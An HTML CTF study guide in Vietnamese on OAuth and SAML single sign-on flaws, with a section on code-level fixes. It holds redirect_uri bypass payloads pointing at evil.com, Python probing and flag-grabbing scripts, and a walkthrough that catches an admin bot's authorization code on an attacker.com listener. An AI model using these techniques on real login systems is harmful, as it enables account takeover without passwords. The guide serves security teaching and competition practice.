@@ -1,0 +1,499 @@
+<title>OAuth &amp; SAML — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · OAuth &amp; SAML (Phụ lục)</div>
+    <h1>OAuth 2.0 &amp; SAML — Lỗ hổng SSO</h1>
+    <p class="sub">OAuth và SAML là 2 chuẩn phổ biến cho "Đăng nhập bằng Google/Facebook" hoặc SSO doanh
+    nghiệp — nhiều bước request/redirect qua lại giữa 3 bên (user, app, nhà cung cấp danh tính). Mỗi bước
+    chuyển giao này là 1 điểm có thể bị thiếu kiểm tra, dẫn tới chiếm quyền tài khoản người khác mà không cần
+    mật khẩu.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>3 lỗ hổng OAuth/SAML hay gặp nhất</h2>
+  <p class="lead"><strong>(1) redirect_uri không validate chặt</strong> — OAuth cần 1 URL để nhà cung cấp gửi
+  "mã xác thực" (authorization code) VỀ LẠI app; nếu app CHO PHÉP redirect_uri là domain TUỲ Ý (không chỉ
+  đúng domain của chính app), kẻ tấn công lừa nạn nhân cấp quyền rồi code bị gửi VỀ DOMAIN CỦA KẺ TẤN CÔNG.
+  <strong>(2) state không được kiểm tra (CSRF trong OAuth)</strong> — tham số <code>state</code> phải random
+  và được app LƯU LẠI để so khớp, nếu không có/không kiểm tra, kẻ tấn công ép nạn nhân đăng nhập VÀO TÀI
+  KHOẢN CỦA KẺ TẤN CÔNG mà không biết. <strong>(3) SAML Response không ký đúng cách / XML Signature Wrapping
+  (XSW)</strong> — SAML dùng chữ ký số (digital signature) để xác thực response, nếu app kiểm tra chữ ký
+  SAI VỊ TRÍ trong XML, kẻ tấn công chèn thêm 1 "Assertion" giả vào bên cạnh assertion thật đã ký, app đọc
+  nhầm phần giả.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Luôn kiểm tra 2 thứ đầu tiên khi gặp "Login with..." — redirect_uri (thử đổi domain) và state (thử bỏ hẳn
+  tham số này) — đây là 2 lỗi phổ biến nhất, dễ test nhất, không cần hiểu sâu XML/crypto như SAML.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ OAUTH / SAML</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Có nút "Login with Google/GitHub/..." hoặc URL chứa <code>client_id=</code>,
+        <code>redirect_uri=</code>, <code>response_type=code</code> ⟹ OAuth. URL/form chứa
+        <code>SAMLResponse=</code> (base64) ⟹ SAML.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Có 1 flow "Login with..." thật đang chạy để bắt request qua Burp — không cần tài khoản thật ở nhà
+        cung cấp (Google/GitHub) nếu chỉ test redirect_uri/state; cần 2 tài khoản (nạn nhân + tấn công) nếu
+        test chiếm quyền thật.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Đổi giá trị <code>redirect_uri</code> trong URL authorize sang domain của bạn — nếu nhà cung cấp VẪN
+        redirect (không báo lỗi "redirect_uri mismatch") ⟹ validate không chặt.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (redirect_uri bypass)</span>
+<pre><code><span class="c">rem URL authorize goc (vi du)</span>
+https://provider.com/authorize?client_id=X&amp;redirect_uri=https://app.com/callback&amp;response_type=code&amp;state=abc
+
+<span class="c">rem Thu cac bien the ne validate (tuy provider chap nhan cai nao):</span>
+redirect_uri=https://app.com.evil.com/callback
+redirect_uri=https://app.com%2f@evil.com/callback
+redirect_uri=https://app.com/callback/../../../evil
+redirect_uri=https://evil.com%2f%2eapp.com/callback</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (login CSRF qua thiếu state)</span>
+<pre><code><span class="k">import</span> requests
+
+<span class="c"># Mô phỏng nạn nhân bị dẫn tới authorize URL KHÔNG CÓ state hợp lệ</span>
+authorize_url = (<span class="s">"https://provider.com/authorize?client_id=X"</span>
+                  <span class="s">"&redirect_uri=https://app.com/callback&response_type=code"</span>)
+<span class="c"># Nếu app phía sau redirect_uri KHÔNG kiểm tra state khi nhận code về,</span>
+<span class="c"># nạn nhân (bị dụ mở link này) sẽ vô tình bị liên kết tài khoản provider của</span>
+<span class="c"># kẻ tấn công vào session hiện tại của nạn nhân trên app -- login CSRF.</span>
+<span class="k">print</span>(<span class="s">"Link dụ nạn nhân:"</span>, authorize_url)</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Thử NHIỀU biến thể redirect_uri khác nhau — mỗi provider validate khác nhau, không có 1 cách né nào
+        ăn tất cả. WAF rule nhanh: không áp dụng được ở đây — validate redirect_uri PHẢI làm ở code app/
+        provider (so khớp CHÍNH XÁC EXACT MATCH với domain đã đăng ký, không dùng kiểu "startswith"/wildcard).
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Authorization Code flow (OAuth 2.0)</b> — luồng phổ biến nhất: user được redirect tới
+  nhà cung cấp (provider) để đăng nhập/cấp quyền, provider redirect user VỀ LẠI app kèm 1
+  <code>code</code> ngắn hạn, app dùng code đó (ở phía SERVER, không public) đổi lấy access token thật.</div>
+  <div class="def"><b>redirect_uri</b> — URL mà provider sẽ gửi <code>code</code> về. PHẢI khớp CHÍNH XÁC với
+  domain app đã đăng ký trước với provider — nếu không, kẻ tấn công đổi URL này thành domain của mình để
+  "hứng" code của nạn nhân.</div>
+  <div class="def"><b>state</b> — giá trị ngẫu nhiên app tự sinh TRƯỚC khi redirect user tới provider, rồi
+  SO KHỚP lại khi user quay về — chống CSRF cho chính luồng OAuth (không liên quan gì tới CSRF token thông
+  thường của app, dù cùng nguyên lý).</div>
+  <div class="def"><b>SAML Assertion</b> — phần "khẳng định" trong SAML Response, chứa thông tin user
+  (username, email, quyền...) được KÝ SỐ bởi Identity Provider (IdP) để Service Provider (SP, chính là app)
+  tin tưởng mà không cần hỏi lại IdP.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Nhiều bên, nhiều bước — mỗi bước đều có thể implement thiếu</h2>
+  <p>OAuth/SAML có QUÁ NHIỀU bước redirect/callback qua lại giữa 3 bên độc lập (user, app, provider/IdP). Mỗi
+  bước đều có 1 "giả định an toàn" riêng (redirect_uri đúng domain, state khớp, chữ ký XML đúng vị trí) — dev
+  tích hợp OAuth/SAML CHỈ CẦN BỎ QUA 1 TRONG CÁC GIẢ ĐỊNH đó (thường vì thư viện mặc định không ép buộc, hoặc
+  dev tự code tay 1 phần) là đủ để toàn bộ chuỗi tin tưởng bị phá vỡ.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Account Takeover qua redirect_uri bị đánh cắp code</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 230" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr29)}
+    </style>
+    <defs><marker id="arr29" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="10" width="200" height="45" rx="8" class="box"/>
+    <text x="22" y="30" class="lbl-m">1. Nạn nhân bấm link độc</text>
+    <text x="22" y="44" class="lbl-m">(redirect_uri đã bị đổi)</text>
+
+    <path d="M210,32 H250" class="arrow"/>
+    <rect x="255" y="10" width="200" height="45" rx="8" class="box"/>
+    <text x="267" y="30" class="lbl-m">2. Nạn nhân đăng nhập</text>
+    <text x="267" y="44" class="lbl-m">thật trên provider</text>
+
+    <path d="M355,55 V85" class="arrow"/>
+    <rect x="255" y="90" width="200" height="45" rx="8" class="box-a"/>
+    <text x="267" y="110" class="lbl-a">3. Provider KHÔNG validate</text>
+    <text x="267" y="124" class="lbl-a">chặt -&gt; redirect code TỚI</text>
+
+    <path d="M355,135 V165" class="arrow"/>
+    <rect x="255" y="170" width="200" height="45" rx="8" class="box-a"/>
+    <text x="267" y="190" class="lbl-a">4. Domain KẺ TẤN CÔNG</text>
+    <text x="267" y="204" class="lbl-a">nhận được code thật!</text>
+
+    <rect x="480" y="90" width="190" height="125" rx="8" class="box"/>
+    <text x="492" y="115" class="lbl-m">5. Kẻ tấn công tự dùng</text>
+    <text x="492" y="130" class="lbl-m">code đó đổi lấy access</text>
+    <text x="492" y="145" class="lbl-m">token CỦA NẠN NHÂN,</text>
+    <text x="492" y="160" class="lbl-m">đăng nhập vào app với</text>
+    <text x="492" y="175" class="lbl-m">danh tính nạn nhân --</text>
+    <text x="492" y="190" class="lbl-a">ACCOUNT TAKEOVER hoàn</text>
+    <text x="492" y="205" class="lbl-a">chỉnh, không cần mật khẩu.</text>
+    <path d="M455,135 H475" class="arrow"/>
+  </svg>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Checklist nhanh</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Xác định chuẩn</div><div class="d">Có <code>client_id</code>/<code>response_type</code> trong URL ⟹ OAuth; có <code>SAMLResponse</code> ⟹ SAML.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Test redirect_uri</div><div class="d">Đổi giá trị, xem provider có validate chặt (EXACT MATCH) hay chỉ kiểm tra lỏng (startswith/contains).</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Test state</div><div class="d">Bỏ hẳn tham số <code>state</code>, hoặc dùng lại giá trị cũ — xem app có từ chối không.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Nếu SAML</div><div class="d">Decode base64 <code>SAMLResponse</code>, xem cấu trúc XML, tìm vị trí thẻ <code>&lt;Signature&gt;</code> so với <code>&lt;Assertion&gt;</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước) — dùng extension SAML Raider cho phần SAML</h2>
+  <div class="note burp"><span class="tag">SAML Raider tự động XSW</span>
+  <ol style="margin:4px 0 0">
+    <li>Cài extension <strong>SAML Raider</strong> qua BApp Store (cần Internet 1 lần trước ngày thi).</li>
+    <li>Bắt request chứa <code>SAMLResponse</code>, Send to Repeater — tab "SAML Raider" tự xuất hiện, hiện
+    sẵn nội dung XML đã decode.</li>
+    <li>Nút "XSW Attacks" → chọn lần lượt từng kiểu XSW (XSW1 tới XSW8, mỗi kiểu chèn Assertion giả ở vị trí
+    khác nhau trong cây XML) → Apply → Send → so sánh response.</li>
+    <li>Nếu 1 kiểu XSW thành công (app đọc nhầm assertion giả, chấp nhận username khác), bạn đã chiếm được
+    quyền của user tuỳ ý ghi trong assertion giả.</li>
+  </ol></div>
+  <p>Với OAuth, không cần extension riêng — chỉ cần Repeater sửa trực tiếp URL authorize (mục 06) là đủ.</p>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD CATALOG</div>
+  <h2>Bảng các biến thể bypass redirect_uri</h2>
+  <table>
+    <tr><th>Biến thể</th><th>Lợi dụng điểm yếu nào</th></tr>
+    <tr><td><code>https://app.com.evil.com/callback</code></td><td>Validate kiểu "contains app.com" hoặc "startswith https://app.com" (sai, vì chuỗi này bắt đầu đúng nhưng domain THẬT là evil.com)</td></tr>
+    <tr><td><code>https://app.com%2f@evil.com/callback</code></td><td>Trick userinfo trong URL — phần trước <code>@</code> chỉ là "thông tin đăng nhập" bị bỏ qua, domain THẬT vẫn là phần sau <code>@</code></td></tr>
+    <tr><td><code>https://app.com/callback/..%2f..%2fevil</code></td><td>Path traversal được decode sau khi qua bước validate ban đầu</td></tr>
+    <tr><td>Thêm tham số thừa: <code>https://app.com/callback?x=https://evil.com</code></td><td>Nếu validate chỉ check domain mà không check path/query đúng route đăng ký</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: SAML RAIDER</div>
+  <h2>Không tự tay sửa XML signature — dùng SAML Raider</h2>
+  <div class="def"><b>SAML Raider</b> — Burp extension chuyên dụng cho SAML: tự parse SAMLResponse, cung cấp
+  sẵn 8 kiểu tấn công XML Signature Wrapping (XSW1-XSW8) chỉ cần 1 click áp dụng, tự động tạo lại chứng chỉ
+  X.509 giả để test case tự ký (self-signed) khi cần. Repo chính thức:
+  <code>CompassSecurity/SAMLRaider</code> (450+ sao) — cài qua BApp Store (cần Internet 1 lần trước ngày thi,
+  không tự build/clone tay vì là extension Burp đóng gói <code>.jar</code>).</div>
+  <div class="note tip"><span class="tag">Vì sao không tự viết tay</span>XML Signature Wrapping đòi hỏi hiểu
+  rất sâu về cấu trúc XML namespace/canonicalization — SAML Raider đã đóng gói đúng 8 biến thể XSW đã được
+  nghiên cứu công khai, tự tay làm lại tốn thời gian không cần thiết trong thi đấu có giới hạn giờ.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Tập trung vào OAuth redirect_uri/state (dễ script hoá hơn SAML)</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+AUTHORIZE = <span class="s">"https://provider.com/authorize"</span>
+VARIANTS = [
+    <span class="s">"https://app.com.evil.com/callback"</span>,
+    <span class="s">"https://app.com%2f@evil.com/callback"</span>,
+]
+
+<span class="k">for</span> v <span class="k">in</span> VARIANTS:
+    r = requests.get(AUTHORIZE, params={
+        <span class="s">"client_id"</span>: <span class="s">"X"</span>, <span class="s">"redirect_uri"</span>: v, <span class="s">"response_type"</span>: <span class="s">"code"</span>
+    }, allow_redirects=<span class="k">False</span>)
+    <span class="k">print</span>(v, <span class="s">"-&gt;"</span>, r.status_code, r.headers.get(<span class="s">"Location"</span>))</code></pre>
+
+  <h3>(B) Bản gọn chắc — tự phát hiện biến thể nào được provider CHẤP NHẬN</h3>
+  <pre><code><span class="k">import</span> requests
+
+<span class="k">def</span> <span class="d">find_bypass</span>(provider_authorize_url, client_id, legit_domain, variants):
+    <span class="k">for</span> v <span class="k">in</span> variants:
+        r = requests.get(provider_authorize_url, params={
+            <span class="s">"client_id"</span>: client_id, <span class="s">"redirect_uri"</span>: v, <span class="s">"response_type"</span>: <span class="s">"code"</span>
+        }, allow_redirects=<span class="k">False</span>, timeout=5)
+        loc = r.headers.get(<span class="s">"Location"</span>, <span class="s">""</span>)
+        <span class="k">if</span> r.status_code <span class="k">in</span> (301, 302, 303, 307) <span class="k">and</span> <span class="s">"error"</span> <span class="k">not in</span> loc.lower():
+            <span class="k">return</span> v
+    <span class="k">return</span> <span class="k">None</span>
+
+VARIANTS = [
+    <span class="s">"https://{legit}.evil.com/callback"</span>,
+    <span class="s">"https://{legit}%2f@evil.com/callback"</span>,
+]
+<span class="k">print</span>(find_bypass(<span class="s">"https://provider.com/authorize"</span>, <span class="s">"X"</span>, <span class="s">"app.com"</span>,
+    [v.format(legit=<span class="s">"app.com"</span>) <span class="k">for</span> v <span class="k">in</span> VARIANTS]))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — biến thể đã xác nhận, dùng chung mọi đội</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+WORKING_REDIRECT = <span class="s">"https://app.com.evil.com/callback"</span>  <span class="c"># điền sau khi xác nhận trên service mẫu</span>
+
+<span class="k">def</span> <span class="d">exploit_oauth</span>(host):
+    <span class="k">try</span>:
+        <span class="c"># Lừa nạn nhân (ở đây mô phỏng lại request của chính attacker để minh hoạ luồng)</span>
+        r = requests.get(<span class="s">f"https://{host}/authorize"</span>,
+            params={<span class="s">"client_id"</span>: <span class="s">"X"</span>, <span class="s">"redirect_uri"</span>: WORKING_REDIRECT, <span class="s">"response_type"</span>: <span class="s">"code"</span>},
+            allow_redirects=<span class="k">True</span>, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span></code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">App có nút "Login with CTF-ID" → bắt được URL authorize với <code>redirect_uri=https://app.com/callback</code>.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Test bypass</div><div class="d">Đổi thành <code>https://app.com.attacker.com/callback</code> → provider vẫn redirect kèm code ⟹ validate lỏng.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Dựng listener</div><div class="d">Dùng <code>python3 -m http.server</code> trên domain attacker.com để "hứng" code khi nạn nhân (admin bot) bấm link.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Dụ admin bot bấm link</div><div class="d">Gửi link authorize đã đổi redirect_uri qua kênh admin bot duyệt (xem lại bài XSS/Admin Bot).</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Nhận được code của admin, tự đổi lấy token, đăng nhập app với quyền admin → lấy <code>FHACKER2026{...}</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>WAF hầu như không giúp được — fix phải ở code</h2>
+  <div class="note warn"><span class="tag">Thành thật về giới hạn</span>redirect_uri/state validation PHẢI
+  đúng ở code app/provider — không có cách nào để WAF "chặn" 1 redirect_uri sai mà không hiểu logic nghiệp vụ
+  của chính app. Tương tự, XSW (SAML) đòi hỏi parse và hiểu cấu trúc XML đúng ngữ nghĩa, vượt quá khả năng 1
+  WAF regex thông thường.</div>
+  <p><strong>Fix đúng (ở code, không phải WAF):</strong></p>
+  <ul>
+    <li>redirect_uri: so khớp EXACT STRING MATCH với danh sách đã đăng ký trước, không dùng
+    startswith/contains/regex lỏng.</li>
+    <li>state: BẮT BUỘC random, lưu server-side (session), so khớp đúng 1 lần dùng (one-time).</li>
+    <li>SAML: validate chữ ký trên ĐÚNG node Assertion sẽ được dùng để lấy thông tin user (không phải validate
+    1 node rồi đọc dữ liệu từ node khác).</li>
+  </ul>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi không khai thác được ngay</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Mọi biến thể redirect_uri đều bị từ chối</td><td>Provider validate đúng chuẩn (exact match) — không có lỗ hổng loại này</td><td>Chuyển qua test state (mục 04 bước 3) hoặc tìm lỗ hổng khác trong flow</td></tr>
+    <tr><td>SAML Raider không hiện tab khi Send to Repeater</td><td>Request không có field <code>SAMLResponse</code> rõ ràng (có thể đang ở flow khác, hoặc field tên khác)</td><td>Xem kỹ toàn bộ request/response để tìm đúng tên field, cấu hình lại nếu cần trong tab SAML Raider</td></tr>
+    <tr><td>Login CSRF (thiếu state) không có hiệu ứng</td><td>App tuy không check state nhưng có thêm lớp bảo vệ khác (vd nonce riêng, hoặc liên kết account cần xác nhận thêm bước)</td><td>Đọc kỹ toàn bộ flow, không chỉ dừng ở bước đầu — có thể cần kết hợp thêm 1 bước nữa</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App có flow "Login with..." (OAuth) hoặc SSO doanh nghiệp (SAML) thật, và 1 trong các bước validate (redirect_uri/state/signature) còn lỏng.</td></tr>
+    <tr><td>❌</td><td>App chỉ dùng OAuth để LẤY THÔNG TIN công khai (vd chỉ lấy tên hiển thị để autofill form, không dùng để xác thực đăng nhập) — chiếm được "code" không có giá trị gì để account takeover.</td></tr>
